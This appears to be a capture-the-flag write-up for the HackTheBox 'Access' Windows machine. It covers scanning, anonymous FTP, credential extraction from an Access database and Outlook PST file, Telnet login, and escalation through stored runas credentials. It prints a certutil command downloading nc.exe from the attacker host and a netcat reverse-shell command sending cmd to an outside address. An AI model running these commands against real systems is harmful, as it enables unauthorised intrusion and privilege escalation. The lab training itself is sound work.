---
title: Access
date: 2026-03-01
categories: [CTFs, HackTheBox]
tags: [easy, windows, ftp, mdb, pst, telnet, runas]
media_subpath: /assets/img/HackTheBox/Access
image: 
    path: Access.webp
    lqip: data:image/webp;base64,UklGRlQAAABXRUJQVlA4IEgAAABwAwCdASoUAAsAPzmGulOvKKWisAgB4CcJZQDE2BjeW2SxT4AA/ujxEoQwcifQn2VxcaYFqU09PGFou+5U6K9gulmz3lqgAAA=
    alt: Info Card
---

## Summary

[Access](https://www.hackthebox.com/machines/access){: target="_blank" } is a straightforward Windows machine centered on identifying and connecting small leaks across multiple open services. The entry point involves **anonymous FTP** access to retrieve a ZIP archive and a **Microsoft Access database**. Extracting credentials from a discovered **Outlook .pst email** archive provides initial access via Telnet. For privilege escalation, the presence of stored credentials in the **Windows Credential Manager** allows for the abuse of the `runas /savecred` feature to execute commands as the Administrator.

## Port Scanning

Full TCP Scan with `nmap`

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.13.41 -oN allports
```

![Description: ](image_1.webp)
_Open TCP Ports_

## Service Detection

`Nmap`'s default scripts in order to get juicy info and versions.

```bash
nmap -p21,23,80 -sCV 10.129.13.41 -oN services
```

![Description: ](image_2.webp)
_FTP Anonymous allowed_

### Port 80 Basic Enum

We ran some basic commands and check the page using a browser and there is no useful information for us to take advantage of. So then we will move to port 21.

```bash
❯ whatweb http://10.129.13.41/
http://10.129.13.41/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.129.13.41], Microsoft-IIS[7.5], Title[MegaCorp], X-Powered-By[ASP.NET]
❯ curl -s -X GET http://10.129.13.41/ -I
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Thu, 23 Aug 2018 23:33:43 GMT
Accept-Ranges: bytes
ETag: "44a87bb393bd41:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Tue, 28 May 2024 15:56:34 GMT
Content-Length: 391
```

![Description: ](image_3.webp)
_Web Server_

## Port 21 - FTP Anon

Since **anonymous** login is allowed, we will dig into this service:

![Description: ](image_4.webp)
_Access to FTP_

In **Backups** there is a `.mdb` file that we downloaded to check in our system.

> An .mdb (Microsoft Database) file is the legacy format used by Microsoft Access. It stores relational data like tables and queries.
{: .prompt-info }

![Description: ](image_5.webp)
_Downloading files_

Also in the **Engineer** folder we have a `zip` file that we will transfer to our kali.

![Description: ](image_6.webp)
_Downloading files_

## Shell as Security

The files downloaded from ftp seem interesting. First we have a **Microsoft Access Database** and a `zip` protected via password that contains a [.pst](https://support.microsoft.com/en-us/office/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790){:target="_blank"} file.

![Description: ](image_7.webp)
_Microsoft Access Database_

![Description: ](image_8.webp)
_PST file_

### Extracting Data from Access DB

Using `mdb-tables` we can check all the tables from the database.

```bash
mdb-tables backup.mdb | grep auth
```

![Description: ](image_9.webp)
_Dumping info from Access DB_

To read the content of a table we have to run the following command:

```bash
mdb-export backup.mdb auth_user
```

![Description: ](image_10.webp)
_Credentials on auth_user table_

We got some credentials, so now we can test if one works for the zip file:

![Description: ](image_11.webp)
_Extracting files with 7z_

>**Zip Password**
>
>`access4u@security`
{: .prompt-tip }

## Reading a pst file

You can use `lspst` to check the emails on the pst file. Then you should use `readpst` to dump all the information of that pst file.

```bash
lspst Access\ Control.pst
readpst Access\ Control.pst
cat Access\ Control.mbox | grep security
```

![Description: ](image_12.webp)
_Creds found on PST file_

> You can also use online tools to read those files as shown below.
{: .prompt-warning }

![Description: ](image_13.webp)
_mdb online reader_

![Description: ](image_14.webp)
_pst online reader_

We found a credential so we can check if it works to log in via `telnet`:

![Description: ](image_15.webp)
_Access via telnet_

![Description: ](image_16.webp)
_Link file_

>**Telnet Credentials**
>
>`security:4Cc3ssC0ntr0ller`
{: .prompt-tip }

## Privilege Escalation | RunAs.exe

After some enumeration we found a link to execute some program. We can try to see some content via reading that link file. As you can notice, it is using [runas.exe](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc771525(v=ws.11)){:target="_blank"} to execute this task as Administrator. Also it is using a saved credentials for this to work.

```batch
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
```

![Description: ](image_17.webp)
_Stored creds found_

If you want to validate the stored credential, you could use `cmdkey` as show below:

```batch
cmdkey /list
```

![Description: ](image_18.webp)
_Using cmdkey to validate_

To gain an interactive shell as Administrator abusing this stored credential, we have to transfer `nc.exe` to the target box:

```batch
certutil.exe -f -split -urlcache http://10.10.15.41/nc.exe nc.exe
```

![Description: ](image_19.webp)
_Python http.server_

![Description: ](image_20.webp)
_Using certutil to download nc_

Now we will use `runas.exe` to execute `nc.exe` so we can send us a **cmd** to our machine. This will give us a shell as administrator because we are going to use `/savecred` to use that stored credential.

```batch
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\Temp\runas\nc.exe -e cmd 10.10.15.41 443"
```

![Description: ](image_21.webp)
_Using runas.exe_

![Description: ](image_22.webp)
_Shell as system_

## Flags

- [x] user.txt

```batch
> type C:\Users\security\Desktop\user.txt
647**************************3c5
```

- [x] root.txt

```batch
> type C:\Users\Administrator\Desktop\root.txt
44c**************************216
```
<h2 style="text-align:center;">Thanks for reading! See you on the next one. 🙌</h2>
{: data-toc-skip='' .mt-4 .mb-0 }
